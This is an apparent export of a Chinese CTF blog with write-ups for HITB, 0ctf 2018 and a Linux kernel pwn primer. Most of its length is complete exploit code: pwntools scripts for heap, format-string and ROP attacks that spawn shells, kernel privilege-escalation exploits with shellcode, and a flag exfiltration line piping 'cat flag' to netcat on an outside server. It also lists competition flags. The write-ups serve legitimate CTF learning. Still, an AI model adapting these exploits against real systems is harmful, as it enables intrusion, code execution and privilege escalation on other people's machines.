利用4功能中的编辑函数，由于ptr指针已被我们覆盖，因此可以对bss段上内容任意写，目的是覆盖功能2的指针及功能使用限制的标志位 7 将__free_hook覆写为system，释放堆块，得到shell EXP： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *from ctypes import *debug = 1elf = ELF('./once')#flag&#123;t1-1_1S_0_sImPl3_n0T3&#125;if debug: p = process('./once') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.189.102', 9999) libc = ELF('./libc-2.23.so') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('&gt;')p.sendline('0')p.recvuntil('Invalid choice\n')libc.address = int(p.recvuntil('&gt;')[:-1],16)-libc.symbols['puts']p.sendline('1')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('1')p.recvuntil('size:')p.sendline(str(0xe0))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('a'*16+'b'*8 + chr(0x58))p.recvuntil('&gt;')p.sendline('3')p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send('/bin/sh\0'+ '\0'*0x10 + p64(libc.symbols['__free_hook']) + p64(libc.symbols['_IO_2_1_stdout_'] )+ p64(0) + p64(libc.symbols['_IO_2_1_stdin_']) + p64(0)*2 + p64(next(libc.search('/bin/sh'))) +p64(0)*4 )p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('2')p.send(p64(libc.symbols['system']))p.recvuntil('&gt;')p.sendline('4')p.recvuntil('&gt;')p.sendline('3')print '[*] system ',hex(libc.symbols['system'])p.interactive()#0x08048e48 : add esp, 0x1c ; ret babypwn此题题目给出的提示就是盲pwn ，通过测试可以明显分析出漏洞是格式化字符串，并且偏移是6。并且程序是64位程序，所以编写泄露脚本来dump脚本就可以了。 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 此题的坑点在于使用gets函数来接收用户输入，因此输入\x0a及\x20会被截断 这一点坑了好久一直不懂为啥每次dump输出出来的内容都不对，最后dump出来后修改了几个字节读出了程序的正常逻辑： 12345678910111213141516void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char format; // [sp+0h] [bp-110h]@2 __int64 v4; // [sp+108h] [bp-8h]@1 v4 = v28; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); while ( 1 ) &#123; gets((__int64)&amp;format, 0LL); usleep(0); printf(&amp;format); &#125;&#125; 有了binary文件就比较简单了，通过got表可以泄露出题中给出的setbuf、gets、usleep函数地址，其中printf@got不可用，因为地址是0x601020 ，利用libc-database得到程序的libc。 最终通过修改gets@got为system及linux的并行命令拿到shell，64位的程序格式化字符串需要注意的坑点是哟啊先写字符串再加地址，否则是有截断的。 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180#coding:utf-8from pwn import *debug = 0count = 0#HITB&#123;Baby_Pwn_BabY_bl1nd&#125;#context(arch='i386',os='linux',endian='little')now = 0if debug: p = process('./easy_pwn') libc = ELF('libc6_2.23-0ubuntu10_amd64.so') #context.kernel = 'amd64' #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p) #gdb.attach(p,'vmmap') gdb.attach(p,'b *0x804882b')else: p = remote('47.75.182.113', 9999) libc = ELF('libc6_2.23-0ubuntu10_amd64.so') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000offset = 11def leak(str,output,addr): global now,count #p.recvuntil('Username:') #p.sendline(str) #p.recvuntil('Hello ') #if('Password') #tmp = p.recvuntil('p4nda')#recvuntil('p1e') #a = tmp[0] #if (tmp[0] == 'p') &amp; (tmp[1] == '1')&amp; (tmp[2] == 'e'): # a = '\0' #print (a) #p = remote('47.75.182.113', 9999) p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') #print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' now += 1 else: if addr&amp;0xff == 0x0a: #print '[-] error' #exit(0) count +=1 now += 1 a = '\xf0' else: a = tmp.split('&gt;&gt;&gt;&gt;')[0] now += len(a) print a output.write(a) #p.close() #p.sendline('')def find_offset(): for i in range(1,20): str = '%%%d$x'%(i) print '[%d]'%i leak(str)def ori_file(str,output): p.recvuntil('Username:') p.sendline(str) #p.recvuntil('p4nda') p.recvuntil('Hello ') a = p.recv(1) print hex(int(a)), output.write(a) p.recvuntil('Password') p.sendline('')def find_ori(): i = 0 output = open('bin', 'wb') pro = log.progress('ori_geting') end = 0x1000 while now &lt; end: pro.status('recover:'+hex(0x400000+now)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+now) leak(str,output,0x400000+now) ''' for i in range(0,0x1000): #find_offset() pro.status('recover:'+hex(0x400000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x400000+i) #'%7$s'+'p1e'+'\0'+p64(0x400000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x400000+i) ''' ''' for i in range(0,0x2000): #find_offset() pro.status('recover:'+hex(0x600000+i)) str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0' +p64(0x600000+i)# + p32(0x8048970) #str = '%7$s'+'p1e'+'\0'+p64(0x600000+i)+'\np4nda\0\0\0'# + p32(0x8048970) leak(str,output,0x600000+i) ''' pro.success('get ori_file') output.close()#find_ori()def test(): while 1: a = raw_input() str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(int(a,16)) + '\n'# + p32(0x8048970) + p.sendline(str) p.recvuntil('&lt;&lt;&lt;&lt;') tmp = p.recvuntil('&gt;&gt;&gt;&gt;') print tmp if tmp.startswith('&gt;&gt;&gt;&gt;'): a = '\0' else: a = tmp[0] print a#test()#str = '%7$s'+'p1e'+'\0'+p64(0x40070b)#p.sendline(str)#def find_password():#str = '%14$s'+'\0'*2+'p4nda'+p32(0x804A08C)#find_password(str) #i+=1'''for i in range(0,100): str = '%13$caaa' + p32(0x8040000+i*4) leak(str)'''#print '[-] count ',countstr = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601018) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak1 = u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601030) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak2 = u64(p.recv(6).ljust(8,'\0'))str = '&lt;&lt;&lt;&lt;%8$s&gt;&gt;&gt;&gt;'+'p1e'+'\0'+p64(0x601028) + '\n'p.sendline(str)p.recvuntil("&lt;&lt;&lt;&lt;")leak3 = u64(p.recv(6).ljust(8,'\0'))print '[*] setbuf ',hex(leak1)print '[*] usleep ',hex(leak2)print '[*] gets ',hex(leak3)libc.address = leak1 - libc.symbols['setbuf']print '[*] system ',hex(libc.symbols['system'])context.clear(arch = 'amd64')#str = repr(fmtstr_payload(7, &#123;0x601028: libc.symbols['system']-8 &#125;, write_size='byte'))target = libc.symbols['system']#str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%((target&amp;0xff),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 = "%%%dc%%12$hhn%%%dc%%13$hn"%(((target&amp;0xff)),(target&gt;&gt;8)&amp;0xffff-(target&amp;0xff)) str1 += ';/bin/sh\0;'str1 = str1.ljust(48,'a')str1 += p64(0x601028)str1 += p64(0x601029)print '[+] ',len(str1)#'/bin/sh;' + p64(0x601028) + p64(0x601029) + p64(0x601030) + "%%%dc%%7$p"%((target &amp; 0xff) - 7) if ('\x20' in str1) | ('\x0a' in str1): print '[-]' print str1 exit(0)print str1p.sendline(str1)p.interactive()'''[*] setbuf 0x7fdcfdb2e6b0[*] usleep 0x7fdcfdbb5d60[*] gets 0x7fdcfdb26d80[*] system 0x7fdcfdafd390''' gundam此题是一道比较明显漏洞的题目，漏洞在destroy函数中，一个double free漏洞。 1234567891011121314151617181920212223242526272829__int64 destroy()&#123; __int64 result; // rax@5 __int64 v1; // rcx@8 unsigned int v2; // [sp+4h] [bp-Ch]@3 __int64 v3; // [sp+8h] [bp-8h]@1 v3 = *MK_FP(__FS__, 40LL); if ( !bss_sum ) &#123; puts("No gundam");LABEL_7: result = 0LL; goto LABEL_8; &#125; printf("Which gundam do you want to Destory:"); __isoc99_scanf("%d", &amp;v2); if ( v2 &lt;= 8 &amp;&amp; bss_list[(unsigned __int64)v2] ) &#123; *(_DWORD *)bss_list[(unsigned __int64)v2] = 0; free(*(void **)(bss_list[(unsigned __int64)v2] + 8LL)); goto LABEL_7; &#125; puts("Invalid choice"); result = 0LL;LABEL_8: v1 = *MK_FP(__FS__, 40LL) ^ v3; return result;&#125; 其他不同的是本题使用的libc是libc 2.26版本，此版本及以后，加入了tcache功能，这个功能我在之前的博客 中分析过，加入这个功能会降低堆块利用的难度，只是地址泄露的时候有一定差别。 堆块会优先填充tcache并先从tcache中拿走，在从tcache中拿走的过程中并没有检查size，放入的过程中没有检查double free，因此存在double free可以劫持tcache，造成任意地址写。 此题选择覆写__free_hook为system，最终free拿到shell。 EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *debug = 0#HITB&#123;now_you_know_about_tcache&#125;if debug: p = process('./gundam') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('47.75.37.114', 9999) libc = ELF('./libc.so.6') context.log_level = 'debug' #libc = ELF('./libc-2.23.so') #off = 0x001b0000def build(name,type): p.recvuntil('choice :') p.sendline('1') p.recvuntil('The name of gundam :') p.send(name) p.recvuntil('The type of the gundam :') p.sendline(str(type))def visit(): p.recvuntil('choice :') p.sendline('2')def destroy(index): p.recvuntil('choice :') p.sendline('3') p.recvuntil('Which gundam do you want to Destory:') p.sendline(str(index))def blow(): p.recvuntil('choice :') p.sendline('4')for i in range(0,9): build('p4nda',1) for i in range(0,9): destroy(i)blow()for i in range(0,8): build('a'*8,1)build('a'*8,1)visit()p.recvuntil('Gundam[7] :aaaaaaaa')libc.address = u64(p.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols['__malloc_hook']print '[*] system:',hex(libc.symbols['system'])for i in range(0,8): destroy(i)blow()build('p4nda',1) #0build('/bin/sh\0',1) #0 1build('p4nda',1) #0destroy(0)destroy(0)build(p64(libc.symbols['__free_hook']-0x10),1)# 0 1 2build('a'*0x30,1)build(p64(libc.symbols['system'])*3,1)destroy(1)p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF KETNEL PWN 入门记录]]></title>
    <url>%2F2018%2F04%2F04%2Fkernel-pwn-start%2F</url>
    <content type="text"><![CDATA[从强网杯2018开始，突然发现没有接触过的东西很多想拓展一下自己的知识面，开始从Linux Kernel的PWN入手吧。 最开始参考的是安全客上的两篇文章，都来自o0xmuhe Linux 内核漏洞利用教程（一）：环境配置 Linux 内核漏洞利用教程（二）：两个Demo 本篇博客主要补充上述博客中没有详细描述的地方，和踩过的坑。（可能只有我基础这么差…） 环境配置编译内核文中提到的安装依赖库及qemu时，在make menuconfig就很懵… 1234567$ cd linux-2.6.32.1/$ sudo apt-get install libncurses5-dev$ sudo apt-get install qemu qemu-system$ make menuconfig$ make$ make all$ make modules 突然出现一大堆选项，而且并不知道是干嘛的… 最后发现这个东西仅仅是为了生成.config这个配置文件的，因此直接选择最下面的Save an Alternate Configuration File，然后选择默认命名的.config就可以了。 其余就没为什么问题了，除了make命令时极慢，通常还会报几次错，但网上都搜得到。 编译busybox在编译busybox时，需要去掉 1 Linux System Utilities -&gt; [] Support mounting NFS file system 网络文件系统 2 Networking Utilities -&gt; [] inetd (Internet超级服务器) 配置busyboxqemu的启动，需要使用busybox生成一个简易的文件镜像，采用的方法选择文章中的第二种（第一种我没成功） 首先，在busy-box的根目录下建立_install文件夹，作为文件系统 12cd _installmkdir -pv &#123;bin,sbin,etc,proc,sys,usr/&#123;bin,sbin&#125;&#125; 在_install中的etc文件中增加inittab文件， 123456789cd etctouch inittab-----------------------This is Content---------------------------::sysinit:/etc/init.d/rcS::askfirst:/bin/ash::ctrlaltdel:/sbin/reboot::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r::restart:/sbin/init 增加etc/init.d/rcS文件 123456789101112mkdir init.dcd init.dtouch rcS-----------------------This is Content---------------------------#!/bin/sh#!/bin/shmount -t proc none /procmount -t sys none /sys/bin/mount -n -t sysfs none /sys/bin/mount -t ramfs none /dev/sbin/mdev - 建立完上述文件后，可以制作img镜像了。 在_install文件夹下： 1find . | cpio -o --format=newc &gt; ../rootfs.img 启动qemu启动gdb的脚本 12345678910gdb \ -ex "add-auto-load-safe-path $(pwd)" \ -ex "file vmlinux" \ -ex 'set arch i386:x86-64:intel' \ -ex 'target remote localhost:1234' \ -ex 'break start_kernel' \ -ex 'continue' \ -ex 'disconnect' \ -ex 'set arch i386:x86-64' \ -ex 'target remote localhost:1234' 启动qemu的脚本 1qemu-system-x86_64 -m 128M -kernel linux-2.6.32.1/arch/x86/boot/bzImage -initrd busybox-1.28.2/rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -gdb tcp::1234 -S -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 两个Demo编译内核驱动编译内核及利用的exp、poc时，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下，一定要放在之前下载的内核目录下。 另外，在拷贝文章中给的代码时，把空格替换成TAB，并且命名成Makefile 每次将ko、exp、poc编译好后，放入之前建好的_install文件夹中，每次都需要用find . | cpio -o –format=newc &gt; ../rootfs.img重新建立镜像。 NULL Dereference这个漏洞其实很简单，就是每次调用write函数时，驱动执行以后，就会跳转到0x0地址去执行。 因此，利用mmap申请0x0地址的堆块，然后赋予可执行权限，防止跳转过去以后段错误即可，在mmap出来的堆块写入shellcode提权就没问题了。 和文章中有区别的是，自己作死用的amd64的镜像，其实和普通的PWN是一样的，传参之类的都一样。 附64位的exp 123456789101112131415161718192021222324-----------------------shellcode.s -----------------xor %rax,%raxmov %rax,%rdicall 0xffffffff81081030mov %rax,%rdicall 0xffffffff81080e40ret------------------------exp.c ---------------------#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;char shellcode[] = "\x48\x31\xc0\x48\x89\xc7\xe8\x25\x10\x08\x81\x48\x89\xc7\xe8\x2d\x0e\x08\x81\xc3";int main()&#123; mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0); memcpy(0, shellcode, sizeof(shellcode)); int fd = open("/proc/bug1", O_WRONLY); write(fd, "muhe", 4); system("/bin/sh");//get root shell return 0;&#125; Kernel Stack Overflow这个函数在write中有一个栈溢出漏洞，需要关闭canary重新编译内核，建议把之前用的内核vmlinux保存下来，然后修改.config后，make -&gt; make all -&gt; make modules就可以了… 在其他问题中，AT&amp;T在64位下实在是太磨人了，附64位exp（汇编写的很渣…） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;unsigned long long eip,user_cs,user_eflags,user_sp,user_ss;char bin_sh[] = "/bin/sh";struct trap_frame&#123; void *eip; uint32_t cs; uint32_t eflags; void *rsp; uint32_t ss;&#125;__attribute__((packed));struct trap_frame tf;void get_shell(void)&#123; system("/bin/sh");&#125;void init_tf_work(void)&#123; unsigned long long i = 0x50; unsigned long long j = 0x78; asm( //"pushq %%ss\n" "subq %2,%%rsp\n" "movq %%ss,%%rax\n" "pushq %%rax\n" "pushq %%rsp\n" "pushfq\n" //"pushq %%cs\n" "movq %%cs,%%rax\n" "pushq %%rax\n" "pushq %0\n" "movq %%rsp,%1\n" "addq %3,%%rsp" :"=m"(eip),"=r"(user_sp),"=m"(i),"=m"(j) : :"memory" );&#125;#define KERNCALL __attribute__((regparm(3)))void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xffffffff81080db0;void (*commit_creds)(void*) KERNCALL = (void*) 0xffffffff81080bc0;void payload(void)&#123; //payload here commit_creds(prepare_kernel_cred(0)); asm( "movq %0,%%rsp\n" "iretq\n" :"=m"(user_sp) );&#125;int main(void)&#123; char buf[40]; memset(buf,0x41,40); eip =(unsigned long long) get_shell; *((void**)(buf+32)) = &amp;payload; //set eip to payload init_tf_work(); write(1,buf,sizeof(buf)); int fd = open("/proc/bug2",O_WRONLY); //exploit write(fd,buf,sizeof(buf)); return 0;&#125;]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0ctf 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F04%2F04%2F0ctf2018%2F</url>
    <content type="text"><![CDATA[这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，对就叫emmmm。还被TX点名了，hhhhhh。 靠着 BLUECAKE@DUBHE 大佬，队伍一共出了三道PWN题。 babystack一道不做作的栈溢出题目，没有开PIE和CANARY保护，也没有输出orz，突然想起之前做过pwnable.tw上的starbound时，曾经接触过一种方法叫return-to-dl-resolve，这种方法可以再没有libc的条件下，找到并执行system函数。 这篇博客对这个知识点讲的很清楚 http://www.freebuf.com/articles/system/149214.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *from ctypes import *import hashlibimport stringdebug = 0elf = ELF('./babystack')#flag&#123;return_to_dlresolve_for_warming_up&#125;ct = string.ascii_letters+string.digits#context.log_level = 'debug'def login(io):# io.recvuntil("+") s = io.recvline()[:-1] #io.recvuntil("== ") #dst = io.recvuntil("\n")[:-1] print repr(s) #print repr(dst) def getpre(): for c1 in ct: for c2 in ct: for c3 in ct: for c4 in ct: pre = c1 + c2 + c3 + c4 #hasho = hashlib.sha256(s+pre) #print hasho.hexdigest() if hashlib.sha256(s + pre).digest().startswith('\0\0\0'):#hasho.hexdigest().lower().startswith('\0\0\0'): return pre pre = getpre() print pre io.send(pre)if debug: p = process('./babystack') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p =remote('202.120.7.202', 6666) #libc = ELF('./libc-2.23.so') #off = 0x001b0000 login(p) context.log_level = 'debug'bss_start = 0x804a000leave_ret = 0x8048455pppr = 0x080484e9relplt = 0x80482b0#gdb.attach(p,'b *0x80484e9')part1 = 'a'*0x28 + p32(bss_start+0x800) + p32(elf.symbols['read']) + p32(leave_ret) + p32(0) + p32(bss_start+0x800) + p32(40)print '[*] part1 ' ,len(part1)#p.send(part1)rop1 = p32(bss_start+0x800+0x200) + p32(elf.symbols['read']) + p32(pppr) + p32(0) + p32(bss_start + 0x100) +p32(44)rop1 += p32(0x80482f0) + p32(bss_start+0x100 - relplt) +p32(pppr)+ p32(0x804a124)# + p32(0) + p32(bss_start + 0x200) +p32(0x100)print '[*] part2 ' ,len(rop1)#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) #p.send(rop1)rop2 = p32(0x0804a00c)+p32(0x0001f407)+ p32(0xdeadbeef) + p32(0x1ef0) + p32(0) + p32(0) + p32(12) + 'system\0\0'rop3 = rop2 + '/bin/sh\0'print '[*] part3 ' ,len(rop3)#rop = rop3 + 'a'*(0x100-len(rop3))p.send(part1+rop1+rop3)p.interactive()'''0x080484eb : pop ebp ; ret0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x080482e9 : pop ebx ; ret0x080484ea : pop edi ; pop ebp ; ret0x080484e9 : pop esi ; pop edi ; pop ebp ; ret 0x00000006 (SYMTAB) 0x80481cc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x804827cpwndbg&gt; x /4wx 0x80481cc+160x80481dc: 0x0000001a 0x00000000 0x00000000 0x00000012''' 拿到shell，发现此题没有输出… 解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了… 最后看到flag，果然这种方法就是预期解… babyheap此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是alignedhook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\_malloc_hook为one_gadget，从而拿到shell了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env python# coding=utf-8from pwn import *#flag&#123;have_fun_with_fastbin&#125;context.log_level = "DEBUG"p = remote("202.120.7.204",127)#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)def allocate(size): p.sendlineafter('Command:', '1') p.sendlineafter('Size:', str(size))def update(index, size, content): p.sendlineafter('Command:', '2') p.sendlineafter('Index:', str(index)) p.sendlineafter('Size:', str(size)) p.sendlineafter('Content:', content)def delete(index): p.sendlineafter('Command:', '3') p.sendlineafter('Index:', str(index))def view(index): p.sendlineafter('Command:', '4') p.sendlineafter('Index:', str(index))allocate(0x58) # 0allocate(0x58) # 0 1allocate(0x58) # 0 1 2 update(0, 0x59, 'a'*0x58 + '\xc1')allocate(0x20) # 0 1 2 3delete(1) # 0 2 3allocate(0x58) # 0 1 2 3view(2)p.recvuntil('Chunk[2]: ')leak_addr = u64(p.recv(6) + '\x00\x00')main_arena = leak_addr - 88print('main_arena is ' + hex(main_arena))libc = ELF('./libc-2.24.so')#('/lib/x86_64-linux-gnu/libc.so.6')libcbase = main_arena - 0x10 - libc.symbols['__malloc_hook']delete(3)allocate(0x58) # 0 1 2 3delete(3)allocate(0x58) # 0 1 2 3 (2==3)allocate(0x58) # 0 1 2 3 4allocate(0x58) # 0 1 2 3 4 5 allocate(0x38) # 0 1 2 3 4 5 6allocate(0x48) # 0 1 2 3 4 5 6 7update(4, 0x59, 'a'*0x58 + '\xf1')delete(5) # 0 1 2 3 4 6 7allocate(0x58) # 0 1 2 3 4 5 6 7allocate(0x38) # 0 1 2 3 4 5 6 7 8(6==8)delete(8) update(6, 0x8, p64(0x60))allocate(0x38)delete(3)update(2, 0x8, p64(main_arena + 0x10))allocate(0x58) # 0 1 2 3 4 5 6 7 8 allocate(0x58) # 0 1 2 3 4 5 6 7 8 9malloc_hook_head = main_arena - 0x10 - 0x10update(9, 0x58, p64(0)*7 + p64(malloc_hook_head) + p64(0) + p64(leak_addr)*2)allocate(0x40)one_gadget = libcbase + 0x3f35aupdate(10, 8, p64(one_gadget))#db.attach(p)allocate(0x10)#delete(2)#delete(3)p.interactive()'''0x3f306 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x3f35a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xd695f execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''''''0x45526 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4557a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf1651 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0xf24cb execve("/bin/sh", rsp+0x60, environ)constraints: [rsp+0x60] == NULL''' blackhole此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。 并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。 并且发现自己的汇编语言写的真是渣… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#!/usr/bin/env python# coding=utf-8from pwn import *import threadingimport stringimport random, string, subprocess, os, sysfrom hashlib import sha256os.chdir(os.path.dirname(os.path.realpath(__file__)))check_result = Falsedef check(offset, guess, method): # p = process('./blackhole') # gdb.attach(p, open('debug')) global check_result check_result = False while True: p = remote('202.120.7.203', 666) # p = remote('127.0.0.1', 5555) def pow(): chal = p.recvline()[:-1] print chal.encode('hex') for c1 in xrange(256): for c2 in xrange(256): for c3 in xrange(256): for c4 in xrange(256): sol = ''.join(map(chr, (c1, c2, c3, c4))) if sha256(chal + sol).hexdigest().startswith('00000'): p.send(sol) print sha256(chal + sol).hexdigest() return True return False if pow() == True: break output_buffer = '' context.arch = 'amd64' elf = ELF('./blackhole') # context.log_level = 'DEBUG' pop6 = 0x400A4A mov_call = 0x400A30 bss = 0x601100 pop_rbp = 0x4007c0 leave_ret = 0x4009A5 def callfunc(func, arg1, arg2, arg3): rop = p64(pop6) rop += p64(0) + p64(1) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1) rop += p64(mov_call) return rop rop = 'a'*40 rop += callfunc(elf.got['read'], 0, bss, 320) rop += p64(0)*7 rop += p64(pop_rbp) + p64(bss - 8) + p64(leave_ret) rop = rop.ljust(0x100, 'a') # p.send(rop) output_buffer += rop context.arch = 'amd64' shellcode = shellcraft.open('/home/blackhole/flag', constants.O_RDONLY) # shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY) shellcode += shellcraft.read('rax', bss, 60) shellcode += "mov al, byte ptr [%s]; cmp al, %s;" % (hex(0x601100 + offset), hex(guess)) if method == 'equal': shellcode += "jne Exit;" elif method == 'smaller': shellcode += "jl Exit;" else: shellcode += "jg Exit;" shellcode += "Loop:" shellcode += shellcraft.read(0, bss + 0x100, 0x10) # just block the program shellcode += 'jmp Loop;' shellcode += 'Exit:' + shellcraft.exit(0) shellcode = asm(shellcode) bss_rop = callfunc(elf.got['read'], 0, elf.got['alarm'], 1) bss_rop += callfunc(elf.got['read'], 0, bss, constants.SYS_mprotect) bss_rop += callfunc(elf.got['alarm'], 0x601000, 0x1000, 0x7) bss_rop += callfunc(elf.got['read'], 0, bss, len(shellcode)) bss_rop += p64(0)*7 bss_rop += p64(bss) #p.send(bss_rop) # print 'len(bss_rop) is ' + hex(len(bss_rop)) output_buffer += bss_rop # p.send('\x05' + 'a' * constants.SYS_mprotect) # output_buffer += '\x05' + 'a' * constants.SYS_mprotect output_buffer += '\x85' + 'a' * constants.SYS_mprotect output_buffer += shellcode old_time = time.time() # print len(output_buffer) p.send(output_buffer.ljust(0x800, 'f')) try: for i in xrange(5): p.sendline('hack you') print("hack you") time.sleep(1) times = i p.close() except Exception as e: times = i p.close() if times &gt; 3: check_result = True def binSearch(offset, start, end): while start &lt; end: print start, end, chr(start), chr(end) medium = (start + end) / 2 check(offset, medium, 'equal') if check_result: return medium check(offset, medium, "smaller") if check_result: start, end = medium, end else: start, end = start, medium return start flag = 'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'for i in range(len(flag), 60): result = binSearch(i, 33, 128) flag += chr(result) log.info("flag is " + flag)]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[QWBCTF 2018 PWN 部分题解]]></title>
    <url>%2F2018%2F03%2F27%2FQWB2018%2F</url>
